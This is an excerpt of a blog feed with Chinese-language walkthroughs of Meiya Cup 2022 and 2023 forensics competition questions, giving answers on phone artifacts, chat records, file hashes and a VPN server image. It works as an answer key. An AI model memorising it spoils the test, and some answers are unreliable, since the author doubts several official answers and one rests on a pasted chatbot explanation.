data-srcset="/2024/11/03/MeiYa2022-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2022-Individual%5C55.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="55"></p><p><img src="/2024/11/03/MeiYa2022-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2022-Individual%5C54.png" class="lazyload" data-srcset="/2024/11/03/MeiYa2022-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2022-Individual%5C54.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="54"></p><h5 id="59填空题检视-docker-容器mysql-内数据库里的资料李大辉的出生日期是如答案为-2022-12-29需答-20221229-3分"><a class="markdownIt-Anchor" href="#59填空题检视-docker-容器mysql-内数据库里的资料李大辉的出生日期是如答案为-2022-12-29需答-20221229-3分">#</a> 59.[填空题] 检视 Docker 容器’mysql’ 内数据库里的资料，李大辉的出生日期是？(如答案为 2022-12-29，需答 20221229) (3 分)</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">19850214</span><br></pre></td></tr></table></figure><p>ctrl+f</p><p><img src="/2024/11/03/MeiYa2022-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2022-Individual%5C56.png" class="lazyload" data-srcset="/2024/11/03/MeiYa2022-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2022-Individual%5C56.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="56"></p><p>sql 语句</p><p><img src="/2024/11/03/MeiYa2022-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2022-Individual%5C57.png" class="lazyload" data-srcset="/2024/11/03/MeiYa2022-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2022-Individual%5C57.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="57"></p><h5 id="60多选题-通过取证调查结果进行分析包括但不限于以上问题及情节林浚熙的行为涉及哪一种罪案5分"><a class="markdownIt-Anchor" href="#60多选题-通过取证调查结果进行分析包括但不限于以上问题及情节林浚熙的行为涉及哪一种罪案5分">#</a> 60.[多选题] 通过取证调查结果进行分析 (包括但不限于以上问题及情节)，林浚熙的行为涉及哪一种罪案？(5 分)</h5><p>A. 勒索金钱</p><p>B. 抢劫</p><p>C. 购买毒品</p><p>D. 传送儿童色情物品</p><p>E. 诈骗</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C</span><br></pre></td></tr></table></figure><p>购买毒品</p><p><img src="/2024/11/03/MeiYa2022-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2022-Individual%5C58.png" class="lazyload" data-srcset="/2024/11/03/MeiYa2022-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2022-Individual%5C58.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="58"></p><h5 id="61填空题-王晓琳手机的meid号是什么以阿拉伯数字回答1分"><a class="markdownIt-Anchor" href="#61填空题-王晓琳手机的meid号是什么以阿拉伯数字回答1分">#</a> 61.[填空题] 王晓琳手机的 MEID 号是什么？(以阿拉伯数字回答)(1 分)</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">352978115584444</span><br></pre></td></tr></table></figure><p><img src="/2024/11/03/MeiYa2022-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2022-Individual%5C59.png" class="lazyload" data-srcset="/2024/11/03/MeiYa2022-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2022-Individual%5C59.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="59"></p><h5 id="62多选题-王晓琳的手机安装了什么即时通讯软件lnstant-messaging-apps1分"><a class="markdownIt-Anchor" href="#62多选题-王晓琳的手机安装了什么即时通讯软件lnstant-messaging-apps1分">#</a> 62.[多选题] 王晓琳的手机安装了什么即时通讯软件 (lnstant Messaging Apps)?(1 分)</h5><p>A. Signal</p><p>B. 微信 (WeChat)</p><p>C. QQ</p><p>D. WhatsApp</p><p>E. LINE</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ABD</span><br></pre></td></tr></table></figure><p><img src="/2024/11/03/MeiYa2022-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2022-Individual%5C60.png" class="lazyload" data-srcset="/2024/11/03/MeiYa2022-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2022-Individual%5C60.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="60"></p><h5 id="63单选题-王晓琳于什么日子和时间曾经通过即时通讯软件发出一个-pdf档案以时区utc8回答1分"><a class="markdownIt-Anchor" href="#63单选题-王晓琳于什么日子和时间曾经通过即时通讯软件发出一个-pdf档案以时区utc8回答1分">#</a> 63.[单选题] 王晓琳于什么日子和时间曾经通过即时通讯软件发出一个 PDF 档案？(以时区 UTC+8 回答)(1 分)</h5><p>A.2022-09-30 17:39:53</p><p>B.2022-10-01 17:39:53</p><p>C.2022-09-30 18:30:28</p><p>D.2022-10-01 16:30:22</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">A</span><br></pre></td></tr></table></figure><p>另一个看着像论文而不是档案</p><p><img src="/2024/11/03/MeiYa2022-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2022-Individual%5C61.png" class="lazyload" data-srcset="/2024/11/03/MeiYa2022-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2022-Individual%5C61.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="61"></p><h5 id="64填空题-承上题这个-pdf-档案的md5哈希值hash-value-是什么以大写英文及阿拉伯数字回答1分"><a class="markdownIt-Anchor" href="#64填空题-承上题这个-pdf-档案的md5哈希值hash-value-是什么以大写英文及阿拉伯数字回答1分">#</a> 64.[填空题] 承上题，这个 PDF 档案的 MD5 哈希值 Hash Value) 是什么？(以大写英文及阿拉伯数字回答)(1 分)</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AE0D6735BBE45B0B8F1AB7838623D9C8</span><br></pre></td></tr></table></figure><p>右击直接计算</p><p><img src="/2024/11/03/MeiYa2022-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2022-Individual%5C62.png" class="lazyload" data-srcset="/2024/11/03/MeiYa2022-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2022-Individual%5C62.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="62"></p><h5 id="65单选题-王晓琳将这个pdf-档案发给哪一个用户而该用户的手机号码是什么1分"><a class="markdownIt-Anchor" href="#65单选题-王晓琳将这个pdf-档案发给哪一个用户而该用户的手机号码是什么1分">#</a> 65.[单选题] 王晓琳将这个 “PDF 档案发给哪一个用户，而该用户的手机号码是什么？(1 分)</h5><p>A.85297663607</p><p>B.85259308538</p><p>C.85269707307</p><p>D.85246427813</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">B</span><br></pre></td></tr></table></figure><p>找一下 WhatsApp 的聊天记录</p><p><img src="/2024/11/03/MeiYa2022-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2022-Individual%5C63.png" class="lazyload" data-srcset="/2024/11/03/MeiYa2022-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2022-Individual%5C63.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="63"></p><h5 id="66多选题-王晓琳发出这个pdf-档案的原因是什么1分"><a class="markdownIt-Anchor" href="#66多选题-王晓琳发出这个pdf-档案的原因是什么1分">#</a> 66.[多选题] 王晓琳发出这个，PDF 档案的原因是什么？(1 分)</h5><p>A. 寻求协助</p><p>B. 分享档案内容</p><p>C. 错误发出</p><p>D. 无法开启</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AD</span><br></pre></td></tr></table></figure><p><img src="/2024/11/03/MeiYa2022-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2022-Individual%5C64.png" class="lazyload" data-srcset="/2024/11/03/MeiYa2022-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2022-Individual%5C64.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="64"></p><h5 id="67单选题-承上题分析王晓琳与上述用户的对话他们的关系是什么1分"><a class="markdownIt-Anchor" href="#67单选题-承上题分析王晓琳与上述用户的对话他们的关系是什么1分">#</a> 67.[单选题] 承上题，分析王晓琳与上述用户的对话，他们的关系是什么？(1 分)</h5><p>A. 客户</p><p>B. 师生</p><p>C. 家人</p><p>D. 同事</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">D</span><br></pre></td></tr></table></figure><p><img src="/2024/11/03/MeiYa2022-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2022-Individual%5C65.png" class="lazyload" data-srcset="/2024/11/03/MeiYa2022-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2022-Individual%5C65.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="65"></p><h5 id="68单选题-王晓琳于何时要求上述用户删除-张照片1分"><a class="markdownIt-Anchor" href="#68单选题-王晓琳于何时要求上述用户删除-张照片1分">#</a> 68.[单选题] 王晓琳于何时要求上述用户删除 张照片？(1 分)</h5><p>A. 2022-10-06</p><p>B. 2022-09-28</p><p>C. 2022-09-30</p><p>D. 2022-10-03</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">D</span><br></pre></td></tr></table></figure><p><img src="/2024/11/03/MeiYa2022-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2022-Individual%5C66.png" class="lazyload" data-srcset="/2024/11/03/MeiYa2022-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2022-Individual%5C66.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="66"></p><h5 id="69单选题-承上题该用户向王晓琳提出什么要求以删除这张照片1分"><a class="markdownIt-Anchor" href="#69单选题-承上题该用户向王晓琳提出什么要求以删除这张照片1分">#</a> 69.[单选题] 承上题，该用户向王晓琳提出什么要求以删除这张照片？(1 分)</h5><p>A. 金钱</p><p>B. 毒品</p><p>C. 性服务</p><p>D. 加密货币</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">A</span><br></pre></td></tr></table></figure><p>同上</p><h5 id="70单选题-王晓琳的手机里有什么电了书籍electronic-book-2分"><a class="markdownIt-Anchor" href="#70单选题-王晓琳的手机里有什么电了书籍electronic-book-2分">#</a> 70.[单选题] 王晓琳的手机里有什么电了书籍 (Electronic Book) ?(2 分)</h5><p>A. 三国演义</p><p>B. 红楼梦</p><p>C. 水浒传</p><p>D. 西游记</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">A</span><br></pre></td></tr></table></figure><p>看第一题，首尾呼应了</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;复现一下，准备一下 2024 的美亚&lt;/p&gt;
&lt;p&gt;学习链接：&lt;/p&gt;
&lt;p&gt;1、&lt;a href=&quot;https://forensics.xidian.edu.cn/wiki/MeiyaCup2022Indivi/&quot;&gt;2022 美亚杯个人赛 - XDforensics-Wik</summary>
      
    
    
    
    <category term="取证" scheme="https://dr4x3zz.github.io/categories/%E5%8F%96%E8%AF%81/"/>
    
    
    <category term="取证" scheme="https://dr4x3zz.github.io/tags/%E5%8F%96%E8%AF%81/"/>
    
  </entry>
  
  <entry>
    <title>MeiYa2023_Individual</title>
    <link href="https://dr4x3zz.github.io/2024/10/20/MeiYa2023-Individual/"/>
    <id>https://dr4x3zz.github.io/2024/10/20/MeiYa2023-Individual/</id>
    <published>2024-10-20T08:50:27.000Z</published>
    <updated>2024-11-03T05:30:52.396Z</updated>
    
    <content type="html"><![CDATA[<p>复现一下，准备一下 2024 的美亚</p><p>参考：</p><p>官方传送门：<a href="https://www.meiyacup.cn/Mo_index_gci_36.html">历年赛题及解析 - 美亚杯</a></p><p>1、<a href="https://blog.csdn.net/tanbinn/article/details/134527004">2023 美亚杯个人赛全题目复盘_数据安全竞赛复盘 - CSDN 博客</a></p><p>2、<a href="https://blog.csdn.net/xydsg/article/details/134448041">23 美亚个人赛复盘（实操题）_2023 美亚资格赛复盘 - CSDN 博客</a></p><p>3、<a href="https://mp.weixin.qq.com/s/lxAlUo93Si1p814TNHqKGg">2023 第九届 “美亚杯” 全国电子数据取证竞赛个人赛实操部分参考 wp</a></p><p>4、<a href="https://blog.csdn.net/2301_77163694/article/details/134449792">2023 美亚杯 个人资格赛 wp 复盘_2023 解压密码 个人赛 美亚杯 全国电子数据取证大赛 - CSDN 博客</a></p><p>5、<a href="https://www.ctfiot.com/145808.html">2023 第九届 “美亚杯” 全国电子数据取证竞赛个人赛实操部分参考 wp | CTF 导航</a></p><h5 id="1-填空题-李大辉所用手机移动运营商公司的名称是什么提示请所有字母都用大写英文-1分"><a class="markdownIt-Anchor" href="#1-填空题-李大辉所用手机移动运营商公司的名称是什么提示请所有字母都用大写英文-1分">#</a> 1. [填空题] 李大辉所用手机移动运营商公司的名称是什么？提示：请所有字母都用大写英文 (1 分)</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DUCK</span><br></pre></td></tr></table></figure><p><img src="/2024/10/20/MeiYa2023-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2023-Individual%5Ca37.png" class="lazyload" data-srcset="/2024/10/20/MeiYa2023-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2023-Individual%5Ca37.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="a37"></p><p>火眼一把梭</p><h5 id="2-单选题-李大辉的手机安装了什么即时通讯软件-1分"><a class="markdownIt-Anchor" href="#2-单选题-李大辉的手机安装了什么即时通讯软件-1分">#</a> 2. [单选题] 李大辉的手机安装了什么即时通讯软件？ (1 分)</h5><p>A. WhatsApp</p><p>B. LINE</p><p>C. 微信</p><p>D. Signal</p><p>E. QQ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">A</span><br></pre></td></tr></table></figure><p><img src="/2024/10/20/MeiYa2023-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2023-Individual%5Ca38.png" class="lazyload" data-srcset="/2024/10/20/MeiYa2023-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2023-Individual%5Ca38.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="a38"></p><p>其实微信和 WhatsApp 都有，但这是单选题，所以就选择 WhatsApp 了</p><h5 id="3-填空题参考androidbin回答以下题目李大辉的手机安装了什么反追踪软件提示-所有答案字母都用小写字母并用xxx_xxx_xxxxxxx_xxxxxx_xxxx格式作答"><a class="markdownIt-Anchor" href="#3-填空题参考androidbin回答以下题目李大辉的手机安装了什么反追踪软件提示-所有答案字母都用小写字母并用xxx_xxx_xxxxxxx_xxxxxx_xxxx格式作答">#</a> 3.  [填空题] 参考’Android.bin’回答以下题目李大辉的手机安装了什么反追踪软件？提示：所有答案字母都用小写字母并用 xxx_xxx_xxxxxxx_xxxxxx_xxxx 格式作答</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">air_tag_tracker_detect_lite</span><br></pre></td></tr></table></figure><p>官方答案真不知道从哪里找，复现的时候觉得下面这个更合理</p><p><img src="/2024/10/20/MeiYa2023-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2023-Individual%5Ca39.png" class="lazyload" data-srcset="/2024/10/20/MeiYa2023-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2023-Individual%5Ca39.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="a39"></p><p>查了一下</p><blockquote><h4 id="exif-是什么"><a class="markdownIt-Anchor" href="#exif-是什么">#</a> Exif 是什么？</h4><p>Exif 就是用来记录拍摄图像时的各种信息：图像信息（厂商，分辨率等），相机拍摄记录（ISO，白平衡，饱和度，锐度等），缩略图（缩略图宽度，高度等），gps（拍摄时的经度，纬度，高度）等，将这些信息按照 JPEG 文件标准放在图像文件头部。</p></blockquote><p>所以 exif 的修改器可以算作是反追踪软件</p><h5 id="4单选题-参考androidbin回答以下题目李大辉的手机是什么时间成功登入whatsapp"><a class="markdownIt-Anchor" href="#4单选题-参考androidbin回答以下题目李大辉的手机是什么时间成功登入whatsapp">#</a> 4.[单选题] 参考’Android.bin’回答以下题目，李大辉的手机是什么时间成功登入 WhatsApp？</h5><p>A. 2022-08-18_21:52:30</p><p>B. 2022-08-19_21:56:23</p><p>C. 2022-08-18_21:56:37</p><p>D. 2022-08-19_06:59:07</p><p>E. 2022-08-19_07:01:17</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C</span><br></pre></td></tr></table></figure><p><img src="/2024/10/20/MeiYa2023-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2023-Individual%5Ca40.png" class="lazyload" data-srcset="/2024/10/20/MeiYa2023-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2023-Individual%5Ca40.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="a40"></p><p>结合收到注册或者登录验证码来推断，不可能同秒登录，所以选 C</p><h5 id="5-填空题-参考androidbin回答以下题目李大辉登入whatsapp时的认证短码是什么提示-请以阿拉伯数字作答"><a class="markdownIt-Anchor" href="#5-填空题-参考androidbin回答以下题目李大辉登入whatsapp时的认证短码是什么提示-请以阿拉伯数字作答">#</a> 5.  <strong>[填空题]</strong> 参考’Android.bin’回答以下题目，李大辉登入 WHATSAPP 时的认证短码是什么？提示：请以阿拉伯数字作答</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">304313</span><br></pre></td></tr></table></figure><p>同上</p><h5 id="6-参考androidbin回答以下题目李大辉到美丽好化妆品公司的入职时间是何时"><a class="markdownIt-Anchor" href="#6-参考androidbin回答以下题目李大辉到美丽好化妆品公司的入职时间是何时">#</a> 6. 参考’Android.bin’回答以下题目，李大辉到美丽好化妆品公司的入职时间是何时？</h5><p>A. 2016-04-16</p><p>B. 2016-06-28</p><p>C. 2017-05-25</p><p>D. 2017-07-25</p><p>E. 2017-08-18</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C</span><br></pre></td></tr></table></figure><p><img src="/2024/10/20/MeiYa2023-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2023-Individual%5Ca41.png" class="lazyload" data-srcset="/2024/10/20/MeiYa2023-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2023-Individual%5Ca41.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="a41"></p><p>在 excel 中找到职员证，上面写着入职日期 2017-05-25</p><h5 id="7-参考androidbin回答以下题目李大辉曾于什么时间使用了图像编辑软件"><a class="markdownIt-Anchor" href="#7-参考androidbin回答以下题目李大辉曾于什么时间使用了图像编辑软件">#</a> 7. 参考’Android.bin’回答以下题目，李大辉曾于什么时间使用了图像编辑软件？</h5><p>A. 2022-09-10</p><p>B. 2022-09-12</p><p>C. 2022-10-05</p><p>D. 2022-11-10</p><p>E. 2022-11-13</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">D</span><br></pre></td></tr></table></figure><p><img src="/2024/10/20/MeiYa2023-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2023-Individual%5Ca42.png" class="lazyload" data-srcset="/2024/10/20/MeiYa2023-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2023-Individual%5Ca42.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="a42"></p><p>答案是 11 月 10 日，但是找到的都是十月修改的图片</p><h5 id="8-参考server文件夹下的meiya_vpnvmdk回答以下题目这个访问服务器使用了哪个端口提示-请用阿拉伯数字作答"><a class="markdownIt-Anchor" href="#8-参考server文件夹下的meiya_vpnvmdk回答以下题目这个访问服务器使用了哪个端口提示-请用阿拉伯数字作答">#</a> 8. 参考 Server 文件夹下的’Meiya_VPN.vmdk’回答以下题目，这个访问服务器使用了哪个端口？提示：请用阿拉伯数字作答</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">943</span><br></pre></td></tr></table></figure><p><img src="/2024/10/20/MeiYa2023-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2023-Individual%5Ca1.png" class="lazyload" data-srcset="/2024/10/20/MeiYa2023-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2023-Individual%5Ca1.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>可以看到端口 943</p><h5 id="9-参考server文件夹下的meiya_vpnvmdk回答以下题目user1账户最近连接到这个访问服务器时使用的ip地址是多少提示-用ipv4-格式回答"><a class="markdownIt-Anchor" href="#9-参考server文件夹下的meiya_vpnvmdk回答以下题目user1账户最近连接到这个访问服务器时使用的ip地址是多少提示-用ipv4-格式回答">#</a> 9. 参考 Server 文件夹下的’Meiya_VPN.vmdk’回答以下题目，“User1” 账户最近连接到这个访问服务器时使用的 IP 地址是多少？提示：用 IPV4 格式回答</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">192.166.244.167</span><br></pre></td></tr></table></figure><p>在 <code>var/log</code>  下的 <code>openvpnas.log</code>  里 ctrl+f 搜索 user1</p><p><img src="/2024/10/20/MeiYa2023-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2023-Individual%5Ca2.png" class="lazyload" data-srcset="/2024/10/20/MeiYa2023-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2023-Individual%5Ca2.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><h5 id="10-多选题参考server文件夹下的meiya_vpnvmdk回答以下题目哪些文件可以找出这个访问服务器的ubuntu版本"><a class="markdownIt-Anchor" href="#10-多选题参考server文件夹下的meiya_vpnvmdk回答以下题目哪些文件可以找出这个访问服务器的ubuntu版本">#</a> 10. [多选题] 参考 Server 文件夹下的’Meiya_VPN.vmdk’回答以下题目，哪些文件可以找出这个访问服务器的 Ubuntu 版本？</h5><p>A. lsb-release</p><p>B. <a href="http://issue.net">issue.net</a></p><p>C. profile</p><p>D. console</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AB</span><br></pre></td></tr></table></figure><p>仿真看一下，在 <code>/etc/</code>  目录下，也可以用取证大师看</p><p><img src="/2024/10/20/MeiYa2023-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2023-Individual%5Ca3.png" class="lazyload" data-srcset="/2024/10/20/MeiYa2023-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2023-Individual%5Ca3.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p><img src="/2024/10/20/MeiYa2023-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2023-Individual%5Ca4.png" class="lazyload" data-srcset="/2024/10/20/MeiYa2023-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2023-Individual%5Ca4.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><h5 id="11多选题-哪些文件有助于分辨这是一个存储服务器1分"><a class="markdownIt-Anchor" href="#11多选题-哪些文件有助于分辨这是一个存储服务器1分">#</a> 11.[多选题] 哪些文件有助于分辨这是一个存储服务器？(1 分)</h5><p>A. auth.log</p><p>B. sys.log</p><p>C. bash_history</p><p>D. idconfig</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ABC</span><br></pre></td></tr></table></figure><p>gpt 给出如下回答</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">A. auth.log</span><br><span class="line">作用: auth.log 是身份验证相关的日志文件，通常位于 /var/log/auth.log（在某些系统如 Ubuntu 中）。它记录了所有与身份验证相关的活动，如登录尝试、SSH登录、sudo操作等。</span><br><span class="line">应用场景: 该文件可以帮助系统管理员了解服务器的访问行为，特别是在安全审计时。虽然它不能直接反映服务器是否是存储服务器，但它可以记录用户对存储系统的访问尝试、文件操作权限管理等信息。如果服务器是存储服务器，频繁的用户访问记录可能有助于识别。</span><br><span class="line">B. sys.log</span><br><span class="line">作用: sys.log 是系统日志文件，通常位于 /var/log/syslog。它记录了系统启动、服务状态、硬件信息、系统错误、网络设备连接等多种系统级事件。</span><br><span class="line">应用场景: 在存储服务器中，sys.log 可以包含硬盘挂载信息、文件系统错误、RAID阵列状态、网络存储设备（如 NAS）连接信息等。因此，该日志文件非常有可能记录存储相关的操作，帮助判断该服务器是否承担了存储功能。</span><br><span class="line">C. bash_history</span><br><span class="line">作用: bash_history 文件位于用户的主目录中（通常为 ~/.bash_history），它记录了用户在 Bash Shell 中执行的历史命令。</span><br><span class="line">应用场景: 通过查看 bash_history，你可以看到用户使用过的命令。这可能包括与存储相关的命令，如 mount、df、du 等操作存储设备的命令，但这取决于用户的行为。因此，它不能直接标明服务器的类型，只能作为一个辅助线索。</span><br><span class="line">D. idconfig</span><br><span class="line">作用: idconfig 并不是一个标准的 Linux 文件或命令，可能是一个拼写错误。如果假设它是 ifconfig，那么 ifconfig 是网络配置工具，用于显示或配置网络接口。</span><br><span class="line">应用场景: 如果服务器涉及网络文件系统（如 NFS 或 SMB），则网络配置可能与存储系统有关。但 ifconfig 更常用于诊断网络问题，和存储服务器的关联性较弱。</span><br><span class="line">总结：</span><br><span class="line">auth.log 和 sys.log 是最有可能帮助你判断服务器是否为存储服务器的文件，因为它们可能包含与存储相关的访问记录或系统事件。</span><br><span class="line">bash_history 提供的线索取决于用户的操作，不能直接标识服务器的用途。</span><br><span class="line">idconfig（假设是ifconfig）更多与网络相关，和存储服务器的直接关联性较弱。</span><br><span class="line">希望这些信息帮助你理解这些文件的具体作用！</span><br></pre></td></tr></table></figure><h5 id="12-参考server文件夹下的meiya_vpnvmdk回答以下题目这个访问服务器所在时区是哪个时区"><a class="markdownIt-Anchor" href="#12-参考server文件夹下的meiya_vpnvmdk回答以下题目这个访问服务器所在时区是哪个时区">#</a> 12. 参考 Server 文件夹下的’Meiya_VPN.vmdk’回答以下题目这个访问服务器所在时区是哪个时区？</h5><p>A. UTC +9</p><p>B. UTC +8</p><p>C. UTC -7</p><p>D. UTC</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C</span><br></pre></td></tr></table></figure><p>由 <code>/etc/timezone</code>  可知， <code>America/Los_Angeles</code></p><p><img src="/2024/10/20/MeiYa2023-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2023-Individual%5Ca7.png" class="lazyload" data-srcset="/2024/10/20/MeiYa2023-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2023-Individual%5Ca7.png" 